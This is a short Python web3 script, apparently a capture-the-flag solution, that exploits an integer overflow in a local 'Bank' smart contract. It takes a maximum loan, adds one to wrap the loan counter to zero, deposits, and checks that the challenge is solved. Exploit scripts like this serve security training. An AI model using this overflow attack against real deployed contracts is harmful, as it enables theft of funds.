from web3 import Web3, HTTPProvider
import json
web3 = Web3(HTTPProvider("http://127.0.0.1:43895")) # Replace with the actual RPC
contract_address = "0x9129caA5084307b5a7ebB3F7080252027d455287" # Replace with the actual contract address
wallet="0xAbB0594c56951ddc5f62B25a6be71869b911A923" # Replace with the actual wallet

f = open('./build/contracts/Bankbc310c2c3caa05743494615afcb56dc284ed2470379cb05d9c1acb85a3d2e345.json','r')
contract_json=json.load(f)

abi=contract_json['abi']
bank = web3.eth.contract(address=contract_address,abi=abi)
bank.functions.loan(2**48-1).transact({'from':wallet}) # Take a loan of maximum minus one
bank.functions.loan(1).transact({'from':wallet}) # Take a loan of one, overflowing the loan variable. It is now zero!
bank.functions.deposit(2**48-1).transact({'from':wallet,'value':2**48-1}) # Deposit the required ammount


print(bank.functions.isChallSolved().call()) # It is now solved!
